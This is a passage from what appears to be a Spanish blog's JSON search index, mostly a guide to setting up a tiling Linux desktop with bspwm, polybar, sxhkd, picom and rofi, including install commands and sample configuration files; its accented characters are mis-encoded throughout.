animated.sh\n","date":"2022-11-29","id":134,"permalink":"/blog/m%C3%B3dulo-polybar-spotify/","summary":"Si usas polybar, supongo que alguna vez habrÃ¡s pensado en poner un mÃ³dulo para poder controlar spotify y ver que canciÃ³n estÃ¡ sonando. En este post vas a aprender como hacerlo","tags":["Linux","bash","polybar","Spotify"],"title":"MÃ³dulo Polybar Spotify"},{"content":"","date":"2022-11-29","id":135,"permalink":"/tags/polybar/","summary":"","tags":[],"title":"polybar"},{"content":"","date":"2022-11-29","id":136,"permalink":"/tags/spotify/","summary":"","tags":[],"title":"Spotify"},{"content":"En esta guÃ­a explico como puedes crear tu propio entorno completamente personalizable y desde 0, para que puedas dar tu 100% en tu trabajo o estudios. Â¡Aviso! Esta guÃ­a estÃ¡ pensada para distribuciones basadas en debÃ­an aunque se puede hacer en otras tambiÃ©n, pero los comandos cambiaran\nEjemplos de entornos hechos por mÃ­:\nEjemplo 1\nEjemplo 2\nBspwm Â¿QuÃ© es? Bspwm es un gestor de ventanas tipo mosaico, lo cual va muy bien para escribir y programar. Aunque si necesitas hacer tareas en las cuales necesites otro entorno de escritorio, puedes cambiarlo en el menÃº de login.\nÂ¿CÃ³mo se instala? sudo apt install bspwm ConfiguraciÃ³n El archivo de configuraciÃ³n de bspwm se tiene que mover a ~/.config/bspwm/bspwmrc\nbspwmrc default:\n#! /bin/sh pgrep -x sxhkd \u0026gt; /dev/null || sxhkd \u0026amp; bspc monitor -d I II III IV V VI VII VIII IX X bspc config border_width 2 bspc config window_gap 12 bspc config split_ratio 0.52 bspc config borderless_monocle true bspc config gapless_monocle true bspc rule -a Gimp desktop=\u0026#39;^8\u0026#39; state=floating follow=on bspc rule -a Chromium desktop=\u0026#39;^2\u0026#39; bspc rule -a mplayer2 state=floating bspc rule -a Kupfer.py focus=on bspc rule -a Screenkey manage=off AhÃ­ puedes personalizar la cantidad de espacios de trabajo que quieras, puedes poner programas que se ejecuten al abrir bspwm, configurar bordes, etc\u0026hellip;\nPolybar Â¿QuÃ© es? Polybar es una herramienta para crear la barra de estado, es totalmente personalizable, las Ãºnicas dos limitaciones que tiene es que no la puedes poner a la derecha o a la izquierda y que no puedes poner imÃ¡genes.\nÂ¿CÃ³mo se instala? sudo apt install polybar ConfiguraciÃ³n La Polybar se divide en diferentes mÃ³dulos como por ejemplo el mÃ³dulo de la fecha, wifi, etc\u0026hellip; puedes usar los de los temas, aÃ±adir mÃ³dulos extras o crearlos todos desde 0\nTemas Existen muchos temas ya creados para la polybar como por ejemplo\ngithub.com/adi1090x/polybar-themes\nSi os gustan o los usÃ¡is no olvidÃ©is apoyar al creador dÃ¡ndole una estrella en github\nÂ¿CÃ³mo instalar los temas?: adi1090x\n#Clonar el Repositorio git clone https://github.com/adi1090x/polybar-themes #Y entrar en la carpeta, dar permisos de ejecuciÃ³n al setup.sh y ejecutarlo. cd polybar-themes chmod +x setup.sh ./setup.sh Mi tema\n#Clonar el repositorio git clone https://github.com/d3b0o/dotfiles #Crear la carpeta de configuraciones de la polybar y mover la configuraciÃ³n ahÃ­. cd dotfiles mv polybar ~/.config/polybar Ahora en el ~/.config/polybar/ tenÃ©is todos los temas instalados.\nÂ¿QuÃ© hace cada archivo? Cada tema tiene los siguientes archivos (Algunos temas tienen otros archivos, pero al final todos tienen lo mismo)\nArchivo FunciÃ³n config.ini Archivo que contiene la configuraciÃ³n general de la polybar modules.ini ConfiguraciÃ³n de los mÃ³dulos bars.ini ConfiguraciÃ³n de los mÃ³dulos con barras colors.ini Todos los colores launch.sh Al ejecutarlo, se muestra la polybar, para que se muestre la polybar cada vez que abrimos el bspwm tendremos que agregar la ruta del launch en el ~/.config/bspwm/bspwmrc user_modules.ini AhÃ­ estÃ¡n todos los mÃ³dulos de usuario MÃ³dulos ConfiguraciÃ³n mÃ³dulos Principales configuraciones de los mÃ³dulos\nVariables FunciÃ³n interval En interval puedes poner cada cuanto tiempo quieres que se actualice (en segundos) format-prefix Puedes poner el icono que quieras format-prefix-foreground El color del icono label Puedes escoger que es lo que quieres que ponga, en Available tokens tinenes las opciones disponibles format Puedes escoger el formato que quieres que tenga, en Available tokens tinenes las opciones disponibles Â¿CÃ³mo crear un mÃ³dulo? Plantilla para mÃ³dulo script [module/] type = custom/script interval = exec = En exec se tiene que poner el script que quieres que el output salga en la polybar\nPlantilla para mÃ³dulo texto [module/] type = custom/text content = En content va el texto que quieres que salga en la polybar\nEn los mÃ³dulos puedes aÃ±adir que al clicar ejecute algo\u0026hellip;\nclicks posibles click-left = click-middle = click-right = scroll-up = scroll-down = double-click-left = double-click-right = sxhkd Â¿QuÃ© es? sxhkd es un simple servicio de combinaciones de teclas usables dentro de bspwm, requerido para comunicarse con bspwm y lanzar aplicaciones a elecciÃ³n.\nÂ¿CÃ³mo se instala? git clone https://github.com/baskerville/sxhkd.git cd sxhkd make ConfiguraciÃ³n Para la configuraciÃ³n hay que tener el siguiente archivo en ~/.config/sxhkd/sxhkdrc\nhttps://github.com/baskerville/bspwm/blob/master/examples/sxhkdrc\nÂ¿CÃ³mo aÃ±adir comandos personalizados? Abajo del archivo de configuraciÃ³n (~/.config/sxhkd/sxhkdrc)\n#combinaciÃ³n de teclas #que ejecutara #Ejemplo super + shift + g google-chrome Picom Â¿QuÃ© es? Picom, es lo que se conoce como un compositor para Xorg. Se trata de un fork de compton que a su vez es un fork de otros compositorios. Este compositor te permite utilizar tanto sombras, como transparencias, como redondear bordes, etc\u0026hellip;\nÂ¿CÃ³mo se instala? #dependencias sudo apt install libxext-dev libxcb1-dev libxcb-damage0-dev libxcb-xfixes0-dev libxcb-shape0-dev libxcb-render-util0-dev libxcb-render0-dev libxcb-randr0-dev libxcb-composite0-dev libxcb-image0-dev libxcb-present-dev libxcb-xinerama0-dev libxcb-glx0-dev libpixman-1-dev libdbus-1-dev libconfig-dev libgl-dev libegl-dev libpcre2-dev libevdev-dev uthash-dev libev-dev libx11-xcb-dev meson git clone https://github.com/ibhagwan/picom.git cd picom git submodule update --init --recursive meson --buildtype=release . build ninja -C build sudo ninja -C build install ConfiguraciÃ³n El archivo de configuraciÃ³n de picom estÃ¡ en ~/.config/picom/picom.conf, en Ã©l puedes modificar los bordes, sombras, transparencias, etc\u0026hellip;\nEsto es lo que contiene el picom.conf\nhttps://gist.github.com/scheckley/b91d7b50c7f372ba7107baf01127da3a\nRofi Â¿QuÃ© es? Rofi comenzÃ³ como un clon de simpleswitcher, escrito por Sean Pringle, un conmutador de ventana emergente basado aproximadamente en superswitcher. Simpleswitcher sentÃ³ las bases y, por lo tanto, Sean Pringle merece la mayor parte del crÃ©dito por esta herramienta. Rofi (renombrado, ya que perdiÃ³ la propiedad simple) se ha ampliado con funciones adicionales, como un iniciador de aplicaciones y un iniciador de ssh, y puede actuar como un reemplazo de dmenu directo, lo que lo convierte en una herramienta muy versÃ¡til.\nRofi, como dmenu, proporcionarÃ¡ al usuario una lista textual de opciones donde se pueden seleccionar una o mÃ¡s. Esto puede ser ejecutar una aplicaciÃ³n, seleccionar una ventana u opciones proporcionadas por un script externo.\nÂ¿CÃ³mo se instala? sudo apt install rofi ConfiguraciÃ³n Temas Al igual que la polybar hay muchos temas ya creados como por ejemplo:\ngithub.com/adi1090x/rofi\nSi usÃ¡is u os gustan los temas no olvidÃ©is darle una estrella en github\nPara instalar el tema es simplemente:\ngit clone 2--depth=1 https://github.com/adi1090x/rofi.git cd rofi chmod +x setup.sh ./setup.sh ConfiguraciÃ³n temas Todos los temas estÃ¡n en el ~/.config/rofi\nEn el github de los temas hay fotos de todos los temas y puedes escoger el que mÃ¡s te guste\nPara abrir rofi simplemente tienes que ejecutar Ã©l .sh que hay en la carpeta de los temas\n","date":"2022-11-25","id":137,"permalink":"/blog/como-personalizar-tu-entorno-linux/","summary":"Los entornos que vienen por defecto en distribuciones de pentesting como kali o parrot son muy poco productivos. En este post vas a ver un ejemplo de un gestor de ventanas de tipo \u0026lsquo;Tiling\u0026rsquo; llamado bspwm, el cual te va a hacer ser mucho mÃ¡s productivo y rÃ¡pido con tu trabajo","tags":["Linux","PersonalizaciÃ³n"],"title":"Como Personalizar Tu Entorno Linux"},{"content":"","date":"2022-11-25","id":138,"permalink":"/categories/linux/","summary":"","tags":[],"title":"Linux"},{"content":"","date":"2022-11-25","id":139,"permalink":"/tags/personalizaci%C3%B3n/","summary":"","tags":[],"title":"PersonalizaciÃ³n"}]